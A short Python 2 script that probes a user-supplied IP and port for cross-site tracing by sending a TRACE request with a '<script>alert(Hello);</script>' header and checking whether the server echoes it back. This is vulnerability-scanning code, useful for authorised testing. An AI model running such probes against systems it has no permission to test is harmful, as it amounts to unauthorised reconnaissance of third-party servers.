import socket
import time
import sys

numarg = len(sys.argv)
if numarg <= 2:
    print  "Do it right"
    print "python xst + ip address + port"
    sys.exit(0)

target = sys.argv[1] # SET TARGET
port = sys.argv[2] # SET PORT

HTTP = "TRACE / HTTP/1.1"
STRING = "Test: <script>alert(Hello);</script>"
HOST = "Host: " + target

conn=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result=conn.connect_ex((target,int(port)))
conn.settimeout(1.0)

if result == 0:
    conn.send(HTTP + "\n")
    conn.send(STRING + "\n")
    conn.send(HOST + "\n\n")
    data = conn.recv(1024)
    script = "alert"
    if script.lower() in data.lower():
        print ""
        print "Site VULNERABLE to XST\n"
        print "==============================="
        print "Begin Server Response"
        print "==============================="
        print data
        print "==============================="
        print "End Server Response"
        print "==============================="
    else:
        print ""
        print "No Dice not VULNERABLE to XST\n"
        print "============================="
        reasons=data.split('\n')
        print "REASON:"
        print reasons[0]
        print "============================="
else:
    print "Port not open"
    conn.close()
